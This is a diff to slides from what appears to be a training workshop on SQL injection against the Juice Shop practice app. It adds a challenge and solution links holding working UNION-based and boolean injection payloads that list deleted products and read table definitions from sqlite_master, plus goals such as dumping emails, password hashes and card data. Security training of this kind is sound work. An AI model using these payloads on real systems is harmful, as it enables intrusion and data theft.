@@ -168,6 +168,7 @@ String query = "SELECT id FROM users " +
 * Sometimes full SQL error output in response - nice!
 * Sometimes we just see an error with no detail
 * Sometimes we see nothing
+    * Maybe not even the successful result
 
 * Methods:
    * Trial and error
@@ -193,7 +194,7 @@ SELECT name FROM Person WHERE name like 'foo%' UNION
 
 ## Challenge
 
-Find another exploitable SQL injection attack in the Juice Bar app
+Find another exploitable SQL injection vulnerability in the Juice Bar app
 
 ---
 
@@ -209,6 +210,14 @@ Find another exploitable SQL injection attack in the Juice Bar app
 ---
 
 ## Challenge
+
+List details of deleted products
+
+---
+
+## Challenge
+
+(More interesting)
 
 Extract the table definitions
 
@@ -226,6 +235,8 @@ Extract the table definitions
 
 ## Challenge - Solution
 
+[List deleted products](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20%20or%20deletedAt%20is%20not%20null%20--)
+
 [List tables](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20tbl_name%20from%20sqlite_master%20--)
 
 [List table descs](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20sql%20from%20sqlite_master%20--)
@@ -236,7 +247,7 @@ Extract the table definitions
 
 ### Extraction of sensitive data
 
-* Grab the all the emails and encrypted passwords
+* Grab the all the login emails and encrypted passwords
 * Decipher admin's password (easily)
 * Dump the credit card data
 
